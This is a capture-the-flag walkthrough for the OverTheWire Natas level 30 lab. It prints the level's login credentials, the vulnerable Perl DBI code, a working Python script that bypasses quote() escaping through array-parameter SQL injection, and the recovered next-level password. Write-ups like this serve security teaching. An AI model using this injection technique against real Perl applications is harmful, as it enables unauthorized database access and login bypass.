# Natas 29 - Natas 30 
    Username  : natas30
    Password  : wie9iexae0Daihohv8vuu3cei9wahf0e
    URL       : http://natas30.natas.labs.overthewire.org

# Solution 
 The Perl script :
 ```
 if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;

```
Here we got some Perl code that seems to connect to a database. It looks like a SQL Injection however, we need to find a way to bypass the quote() method. As per the documentation quote() escape any special characters (such as quotation marks) contained within the string.

Luckily, the quote() method is vulnerable to array injection. If you pass an array into this method, it will be treated as parameters.

We’ll need to write a Python script to inject an array.

```
import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

s = requests.Session()
s.auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')

args = { "username": "natas31", "password": ["'' or 1", 2] }
r = s.post(url,  data=args)
print (r.text)
```

# Password 
     AMZF14yknOn9Uc57uKB02jnYuhplYka3
